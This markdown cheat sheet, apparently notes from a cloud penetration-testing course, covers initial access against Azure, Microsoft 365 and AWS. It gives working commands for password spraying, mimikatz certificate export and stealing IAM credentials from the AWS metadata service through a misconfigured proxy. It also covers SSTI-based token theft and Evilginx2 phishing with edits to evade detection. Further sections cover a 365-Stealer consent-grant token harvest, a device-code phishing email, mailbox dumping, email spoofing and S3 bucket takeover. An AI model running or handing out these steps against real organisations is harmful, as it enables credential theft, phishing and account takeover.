# Initial access attacks

* [Password and crentials attacks](#Password--and-credentials-attacks)
  * [Password spraying](#Password-spraying)
  * [Bypass MFA](#Bypass-MFA)
  * [Key disclosure in public repositories](#Key-disclosure-in-public-repositories)
  * [Reused access](#Reused-access)
  * [AWS Instance Metadata](#AWS-Instance-Metadata)
* [Web-Application Vulnerabilities](#Web-application-vulnerabilities)
  * [Insecure file upload](#Insecure-file-upload)
  * [Server Side Template Injection](#Server-Side-Template-Injection)
  * [OS Command injection](#OS-Command-injection)
* [Phishing](#Phishing)
  * [Teams](#Teams)
  * [Phishing Evilginx2](#Phishing-Evilginx2)
  * [Illicit Consent Grant phishing](#Illicit-Consent-Grant-phishing)
  * [Google workspace calendar event injection](#Google-workspace-calendar-event-injection)
* [Public storage](#public-storage)
* [Misc](#misc)

## Password and credentials attacks
### Password spraying
- https://github.com/dafthack/MSOLSpray
- https://github.com/ustayready/fireprox
- Also possible with https://github.com/0xZDH/o365spray
```
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
```

#### Find valid emails Azure
- Explained in Recon or use the command below
```
C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
```

#### Trevorspray
- https://github.com/blacklanternsecurity/TREVORspray

### Bypass mfa
#### MFAsweep
- Checks for portals which doesn't enforce mfa
- https://github.com/dafthack/MFASweep
```
Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
```

## Key disclosure in public repositories
- Scavange repos for keys
- Find keys in realtime: https://github.com/eth0izzle/shhgit
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog

### Gitleaks
- https://github.com/zricethezav/gitleaks
#### Search for secrets
```
./gitleaks detect -v source <DIRECTORY>
```

#### Use web browser to view the commit
```
https://github.com/[git account]/[repo name]/commit/[commit ID]
```

## Reused access 
- certs as private keys on web servers
1. Comprimise web server
2. Extract certificate with mimkatz
3. Use it to authenticate to Azure
```
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

### AWS Instance Metadata
- Metadata endpoint is hosted on a non routable IP adress at 169.254.169.254
- Can contain access/secret keys to AWS and IAM credentials
- Server compromise or SSRF vulnerabilities might allow remote attackers to reach it.
- IAM credentials can be stored here ```http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>```
- New version requeres token, a put request is send and then responded to with a token. Then that token can be used to query data

#### Instance Metadata Service URL
```
http://169.254.169.254/latest/meta-data
```

#### Additional IAM creds possibly available here

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

#### IMDS Version 2 has some protections 
- but these commands can be used to access it
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

## Web application vulnerabilities
- Here are some generic things ot look for:
  - Out of date web technologies with known vulns
  - SQL or command injection vulns
  - Server-side-request forgery (SSRF)
  - Arbitrary file upload
- Good place to start post shell:
  - Creds in metadata service
  - Certificates
  - Environment variables
  - Storage Accounts

### Insecure file upload
- Upload a webshell to a insecure webapp
- If command execution is possible execute command ```env```
- if the app service contains environment variables IDENITY_HEADER and IDENTITY_ENDPOINT, it has a managed identity.
- Get access token from managed identity using another webshell. Upload studentxtoken.phtml

### Server Side Template Injection
- SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side. 
- That is, we can get command execution on a server by abusing this.
- Find we webapp which is vulnerable, test with injectin a expression ```{{7*7}}``` and see if it gets evaluated.
- The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework. 
- Use ```{{config.items()}}``` and see if it works.
- Check if a managed identity is assigned (Check for the env variables IDENTITY_HEADER and IDENTITY_ENDPOINT)
- If code execution is possible execute the following to get a ARM access token for the managed identity:
```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
- Request keyvault Access token
```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
- Request AADGraph token
```
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### OS Command injection
- In case of OS command injection, it is possible to run arbitrary operating  system commands on the server where requests are processed. 
- This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests. 

## Phishing
### Teams
- By default Microsoft Teams has federation open with all external Teams organisations.
- This means that other Teams users from different Azure tenants can communicate to your employees directly and exchange messages or files. An attacker can leverage this feature to launch a Social Engineering attack against the victim user.
- Moreover, it is possible to bypass the message request approval by creating a Teams group chat rather than direct chat to the victim.

### Phishing Evilginx2
- https://github.com/kgretzky/evilginx2
- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

#### Start evilgix2
```
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```

#### Configure the domain
```
config domain studentx.corp
```

#### Set the IP for the evilginx server
```
config ip xx.xx.xx.xx
```

#### Use the template for office365
```
phishlets hostname o365 <DOMAIN>
```

#### Verify the DNS entries
```
phishlets get-hosts o365
```

#### Copy the certificate and private key
0365.cr and 0365.key from ```C:\studentx\.evilginx\crt``` to ```C:\studentx\.evilginx\crt\login.studentx.corp```

#### Enable phishlets
```
phislets enable 0365
```

#### Create the phishing URL (Tied to an ID)
```
lures create 0365
```

#### Get the phishing URL
- Share the phishing URL with the victim
```
lures get-url <ID>
```

### Avoid detection
- Avoid detection by removing default Evilginx2 HTTP Header and white list outgoing and incoming IP addresses.

#### Change default redirect uri
```
vim config.go

#Change line with DEFAULT_REDIRECT_URL
```

#### Change the headers
```
vim http_proxy.go

# Comment the following lines
reg.Header.Set(string(hg) egg2)
reg.Header.Set(string(e), e_host)
reg.Header.Set(string(b), nothing_to_see_here)
```

#### Firewall
- Use CSFirewall or iptables to block VPS incoming and outgoing internet access (e.g Allow only Microsoft and the target IP addresses).

## Illicit Consent Grant phishing
- Verified publisher: https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/publisher-verification-and-app-consent-policies-are-now/ba-p/1257374

#### Create a application
- Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
- Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
- Use the URL of the student VM in the URI (https://xx.xx.xx.xx/login/authorized)
- In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
- In the left menu go to 'API permissions' and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.

#### Check if users are allowed to consent to apps
```
Import-Module AzureADPreview.psd1

#Use another tenant account
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

#output should be
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

#### Setup the 365-stealer
- Copy the 365-stealer directory to the xampp directory
- Edit the 365-stealer.py and edit the CLIENTID (client application id), REDIRECTEDURL and CLIENTSECRET (From the certificate)

#### Start the 365-stealer
```
&"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

#### Get the phishinglink
- Browse to https://localhost and click on readmore. Copy the link!

#### Enumerating applications to send the phishing link
- Edit the permutations.txt to add permutations such as career, hr, users, file and backup
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base <BASE> –Verbose
```

#### Get the access tokens
- Browse to http://localhost:82/365-Stealer/yourvictims/
- Click on the user and copy the access token from access_token.txt
- See the "Using Azure tokens" section

#### Get admin consent
- https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent
- Global Admin, Application Admin, or Cloud Application Administrator can all grant tenant wide application admin consent
```
- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
- Refish the user to get a token with the extra permissions
```

#### Start a listener
```
nc.exe -lvp 4444
```

#### Abuse the access token - Uploading word doc to OneDrive
```
cd C:\xampp\htdocs\365-Stealer\

& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload <PATH TO DOC> --token-path C:\xampp\htdocs\365-Stealer\yourVictims\<USER>\access_token.txt
```

#### Refresh all tokens
- Access token is valid for 1 hour, can't be revoked.
- Refresh token is valid for 90 days but can be revoked.
```
python 365-Stealer.py --refresh-all
```

### Google workspace calendar event injection
- Silently injects events to target calendars
- Bypasses the “don’t auto-add” setting
- Include link to phishing page
- https://www.blackhillsinfosec.com/google-calendar-event-injection-mailsniper/

### Email spoofing
- https://www.blackhillsinfosec.com/spoofing-microsoft-365-like-its-1995/
- Microsoft Direct Send is the feature that can be utilised to send spoofing emails.
- The benefits for the the attackers is that the Direct Send feature requires NO authentication and can be sent from OUTSIDE of the organisation.
- There are only 2 prerequisites: Microsoft 365 subscription and Exchange Online Plan

```
Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
```

### Device code auth
- https://aadinternals.com/post/phishing/
- https://www.offsec-journey.com/post/phishing-with-azure-device-codes
- https://www.youtube.com/watch?v=GZ_nn0uRLr4

### Example TokenTactics
- https://github.com/rvrsh3ll/TokenTactics

#### Request Device Code token
- Copy the Device code

```
ipmo .\TokenTactics-main\TokenTactics.psd1

Get-AzureToken -Client MSGraph
```

#### Send device code to the target
- Email example:
```
Dear <USER>,

Use the Code to access the content of the website: https://microsoft.com/devicelogin

Code: <CODE>
```

#### Capture Access Token
- Once the user registers trhe device, TokenTactics will capture the token. This is saved in `$response.access_token

#### Post exploitation
- Example dump mailbox with TokenTactics:
```
Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
AllItems
```

#### Common application ID's
```
ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
ASM Campaign Servicing 	0cb7b9ec-5336-483b-bc31-b15b5788de71
Azure Advanced Threat Protection 	7b7531ad-5926-4f2d-8a1d-38495ad33e17
Azure Data Lake 	e9f49c6b-5ce5-44c8-925d-015017e9f7ad
Azure Lab Services Portal 	835b2a73-6e10-4aa5-a979-21dfda45231c
Azure Portal 	c44b4083-3bb0-49c1-b47d-974e53cbdf3c
AzureSupportCenter 	37182072-3c9c-4f6a-a4b3-b3f91cacffce
Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
```

## Public Storage
### Find data in public storage
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
- https://github.com/jordanpotti/CloudScraper can scan all three cloud services for multiple services.

### Azure
#### Google Dorks
```
site:github.com “StorageConnectionString” “DefaultEndpointsProtocol”
site:http://blob.core.windows.net
```

#### Enumerate Azureblobs
- add permutations to permutations.txt like common, backup, code in the misc directory.
```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base <COMPANY NAME>
```
- Access the URL's and see if any files are listed (Example https://<STORAGE NAME>.blob.core.windows.net/backup?restype=container&comp=list)
- Access the files by adding it to the url (Example https://<STORAGE NAME>.blob.core.windows.net/backup/blob_client.py)
- Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blobl container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.
- Another example: https://<STORAGE NAME>.blob.core.windows.net/<container-name>?restype=container&comp=list

### Public AWS blobs
- https://github.com/RhinoSecurityLabs/pacu

#### Brute force bucket names
- https://github.com/initstring/cloud_enum
```
python3 cloud_enum.py -k <KEYWORD>
```

#### Use the AWS CLI to list the files of the s3 bucket
```
sudo aws s3 ls s3://<BUCKET> --profile <PROFILE>
```

#### Use the AWS CLI to download the files of the s3 bucket
```
sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
```

### Public Google Storage Buckets
- https://github.com/initstring/cloud_enum

### Public SQL database
- https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
- Might be able to bruteforce port 1433

## Misc
## S3 code injection
- If a webapp is loading content from an s3 bucket made publicly writeable. Attackers can upload malicious JS to get executed by visitors.

## Domain hijacking
- Hijack S3 domain by finding references in a webapp to S3 buckets that dont exist anymore.
- Or subdomains were linked to S3 buckets with CNAME that still exist.
- When assessing webapps look for 404's to ```*.s3.amazonaws.com```
1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
2. Go create the S3 bucket with the same name and region
3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site

